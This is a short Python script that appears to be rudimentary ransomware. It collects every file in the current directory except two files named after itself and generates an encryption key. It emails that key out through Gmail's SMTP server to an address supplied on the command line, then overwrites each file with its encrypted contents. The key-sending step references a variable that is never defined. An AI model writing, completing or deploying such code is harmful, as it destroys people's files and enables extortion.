import os
from cryptography.fernet import Fernet
import optparse
import smtplib

file_list = []


def get_user_input():
    option = optparse.OptionParser()
    option.add_option("-e", "--email", dest="email", help="Email (gmail) address")
    option.add_option("-p", "--password", dest="password", help="Password")
    inputs = option.parse_args()[0]
    return inputs


for file in os.listdir():
    if file == "ransom_encrypted.py" or file == "ransom_decrypted.py":
        continue
    if os.path.isfile(file):
        file_list.append(file)


print(file_list)
key = Fernet.generate_key()
print(key)


def send_email(email, password, message):
    email_server = smtplib.SMTP('smtp.gmail.com', 587)
    email_server.starttls()
    email_server.login(email, password)
    email_server.sendmail(email, email, message)
    email_server.quit()


send_email(user_input.email, user_input.password, key)

for file in file_list:
    with open(file, "rb") as files:
        contents = files.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as files:
        files.write(contents_encrypted)
